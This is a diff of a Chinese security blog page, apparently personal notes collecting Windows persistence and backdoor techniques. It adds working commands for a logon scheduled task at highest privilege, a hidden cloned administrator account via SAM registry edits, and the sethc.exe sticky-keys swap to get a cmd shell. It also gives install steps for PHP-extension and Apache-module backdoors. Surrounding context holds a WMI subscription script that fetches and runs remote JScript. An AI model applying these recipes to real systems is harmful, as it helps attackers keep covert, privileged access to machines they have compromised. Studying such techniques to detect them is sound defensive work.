@@ -25,7 +25,13 @@
 <meta property="og:image" content="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/waitfor.png">
 <meta property="og:image" content="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/msdtc.png">
 <meta property="og:image" content="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/office.png">
-<meta property="og:updated_time" content="2018-07-23T11:22:01.934Z">
+<meta property="og:image" content="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/3389.png">
+<meta property="og:image" content="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/3389-2.png">
+<meta property="og:image" content="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/3389-3.png">
+<meta property="og:image" content="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/3389-4.png">
+<meta property="og:image" content="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/micropoor.png">
+<meta property="og:image" content="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/http.png">
+<meta property="og:updated_time" content="2018-07-23T11:31:51.698Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="windows后门种植方式收集">
 <meta name="twitter:description" content="windows后门种植方式收集看三好学生师傅的博客，感觉受益匪浅，就把他记录留后门维持权限的东西总结一下，当做笔记，向师傅看齐。刚好导师让收集一下windows维持权限的方法，在这里也一并记录一下。">
@@ -212,6 +218,17 @@
 <h3 id="2-4-wmi执行后门"><a href="#2-4-wmi执行后门" class="headerlink" title="2.4 wmi执行后门"></a>2.4 wmi执行后门</h3><p>可以实现无文件落地进行后门启动，2015年之后开始兴起，通常是通过powershell进行调用，配合schtasks进行定时启动，绕过杀软，也可以执行JavaScript脚本。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!powershell</span></div><div class="line"><span class="variable">$filterName</span> = <span class="string">'filtP1'</span></div><div class="line"><span class="variable">$consumerName</span> = <span class="string">'consP1'</span></div><div class="line"><span class="variable">$Command</span> =<span class="string">"GetObject("</span><span class="string">"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test"</span><span class="string">")"</span>    </div><div class="line"><span class="variable">$Query</span> = <span class="string">"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</span>    </div><div class="line"><span class="variable">$WMIEventFilter</span> = <span class="built_in">Set-WmiInstance</span> -Class __EventFilter -NameSpace <span class="string">"root\subscription"</span> -Arguments @&#123;Name=<span class="variable">$filterName</span>;EventNameSpace=<span class="string">"root\cimv2"</span>;QueryLanguage=<span class="string">"WQL"</span>;Query=<span class="variable">$Query</span>&#125; -ErrorAction Stop    </div><div class="line"><span class="variable">$WMIEventConsumer</span> = <span class="built_in">Set-WmiInstance</span> -Class ActiveScriptEventConsumer -Namespace <span class="string">"root\subscription"</span> -Arguments @&#123;Name=<span class="variable">$consumerName</span>;ScriptingEngine=<span class="string">'JScript'</span>;ScriptText=<span class="variable">$Command</span>&#125;    </div><div class="line"><span class="built_in">Set-WmiInstance</span> -Class __FilterToConsumerBinding -Namespace <span class="string">"root\subscription"</span> -Arguments @&#123;<span class="keyword">Filter</span>=<span class="variable">$WMIEventFilter</span>;Consumer=<span class="variable">$WMIEventConsumer</span>&#125;</div></pre></td></tr></table></figure></p>
 <p>通过远程下载js脚本，进行命令调用。<br>优点：无文件落地<br>缺点：目前杀软对powershell这类监管较严格，容易被发现</p>
 <h3 id="2-5-劫持office"><a href="#2-5-劫持office" class="headerlink" title="2.5 劫持office"></a>2.5 劫持office</h3><p>劫持word:<br>Office在启动过程中，会自动加载C:\Users\xxx\AppData\Roaming\Microsoft\Word\Startup文件夹中的dll，这样可以通过把后门dll放到这一文件夹中，达到持久控制的目的。<br>亲测：office 2016有效<br><img src="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/office.png" alt=""><br>优点：隐蔽性很高<br>缺点：有一部分机器未装有office，可能启动不成功。</p>
+<h3 id="2-6-计划任务维持权限"><a href="#2-6-计划任务维持权限" class="headerlink" title="2.6 计划任务维持权限"></a>2.6 计划任务维持权限</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schtasks.exe <span class="string">/Create</span> <span class="string">/TN</span> update <span class="string">/TR</span> xx<span class="params">(你要执行的命令)</span>  <span class="string">/SC</span> ONLOGON <span class="string">/F</span> <span class="string">/RL</span> HIGHEST</div></pre></td></tr></table></figure>
+<p>优点：一般杀毒软件不会拦截这条命令<br>缺点：后门存在于系统当中，并且需要做免杀。</p>
+<h2 id="远程登陆方面"><a href="#远程登陆方面" class="headerlink" title="远程登陆方面"></a>远程登陆方面</h2><p>这类后门时间比较久远，防护强度很大，成功几率很小。</p>
+<h3 id="3-1-隐藏、克隆账户"><a href="#3-1-隐藏、克隆账户" class="headerlink" title="3.1 隐藏、克隆账户"></a>3.1 隐藏、克隆账户</h3><p>管理员用户添加隐藏账号并且添加到管理员组:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net<span class="built_in"> user </span>test$ 123456 /add&amp;&amp;net<span class="built_in"> user </span>administrators test$ /add</div></pre></td></tr></table></figure></p>
+<p>之后打开regedt32.exe,修改<code>HKEY_LOCAL_MACHINE\SAM\SAM</code>，在属性中给予administrator完全控制以及读取的权限：<br><img src="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/3389.png" alt=""><br>然后找到test$对应的类型以及文件夹，以及administrator对应的文件夹，<br><img src="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/3389-2.png" alt=""><br>将administrator文件夹中的F值内容复制到test$对应文件夹F值中：<br><img src="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/3389-3.png" alt=""><br>然后导出，使用net user test$ /del删除用户<br><img src="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/3389-4.png" alt=""><br>再将之前导出的注册表导入进去，这样就创建好了账户。</p>
+<p>###3.2 shift后门<br>将C盘windows目录下面的system32文件里面的sethc.exe应用程序进行转移，并生成sethc.exe.bak文件。并将cmd.exe拷贝覆盖sethc.exe<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">C:\&gt;<span class="keyword">cd</span> WINDOWS\system32</div><div class="line">C:\WINDOWS\system32&gt;<span class="keyword">move</span> sethc.<span class="keyword">exe</span> sethc.<span class="keyword">exe</span>.bak</div><div class="line">移动了         <span class="number">1</span> 个文件。</div><div class="line">C:\WINDOWS\system32&gt;<span class="keyword">copy</span> cmd.<span class="keyword">exe</span> sethc.<span class="keyword">exe</span></div><div class="line">覆盖 sethc.<span class="keyword">exe</span> 吗? (Yes/No/All): Yes</div><div class="line">已复制         <span class="number">1</span> 个文件。</div></pre></td></tr></table></figure></p>
+<p>五次shift就能进入服务器。</p>
+<h2 id="4web层面"><a href="#4web层面" class="headerlink" title="4web层面"></a>4web层面</h2><h3 id="4-1-Webshell"><a href="#4-1-Webshell" class="headerlink" title="4.1 Webshell"></a>4.1 Webshell</h3><p>Webshell在web渗透层面还是很常见的，不过作为权限维持的一种方式，个人认为不是很稳定，并且操作起来限制比较大。</p>
+<h3 id="4-2-使用底层后门"><a href="#4-2-使用底层后门" class="headerlink" title="4.2 使用底层后门"></a>4.2 使用底层后门</h3><h4 id="4-2-1-micropoor"><a href="#4-2-1-micropoor" class="headerlink" title="4.2.1 micropoor"></a>4.2.1 micropoor</h4><p>参考链接：<a href="https://micropoor.blogspot.com/2018/05/php-backdoor-for-windows.html" target="_blank" rel="external">https://micropoor.blogspot.com/2018/05/php-backdoor-for-windows.html</a><br>后门比较隐蔽，较难发现。并且在phpinfo以及php-m中隐藏自己。<br>使用方法：<br>①  下载后门文件到php加载库目录(php -i | grep extension)<br>②  修改php.ini文件，加载后门（extension=xxx.dll）<br>③  重启apache服务器。<br>访问任意php文件，post传入micropoor_php=phpinfo();发现已经执行了后门文件。<br><img src="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/micropoor.png" alt=""></p>
+<h4 id="4-2-2-Apache-HTTP-Server-后门"><a href="#4-2-2-Apache-HTTP-Server-后门" class="headerlink" title="4.2.2 Apache HTTP Server 后门"></a>4.2.2 Apache HTTP Server 后门</h4><p>原理是捕获请求的数据包，查看是否要激活后门， 如果有相关的头部(Backdoor),就会执行命令，返回到结构体当中。<br>项目地址：<a href="https://github.com/WangYihang/Apache_HTTP_Server_Module_Backdoor" target="_blank" rel="external">https://github.com/WangYihang/Apache_HTTP_Server_Module_Backdoor</a><br>将后门c文件进行编译，放到apache执行库中，或者使用apxs进行安装。完成之后，就可以进行调用。和micropoor_door相比，这个可以直接执行系统命令，不能和菜刀直接连接。<br><img src="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/http.png" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>搜集了两天，肯定还有很多方法没有总结到，也学到了很多关于windows的东西，在这做个记录吧，以后用到了方便查找，很感谢三好学生还有其他大佬的博客的记录，确实学到了很多姿势～</p>
 <hr>
 <p>本文出自”xnianq Blog”：www.xnianq.cn/2018/07/23/windows后门种植方式收集/</p>
 
@@ -471,7 +488,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">crypto</a>
+                <a href="javascript:void(0)" class="js-tag color3">pentest</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -479,11 +496,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">pentest</a>
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web</a>
+                <a href="javascript:void(0)" class="js-tag color2">crypto</a>
               </li>
              
               <li class="article-tag-list-item">
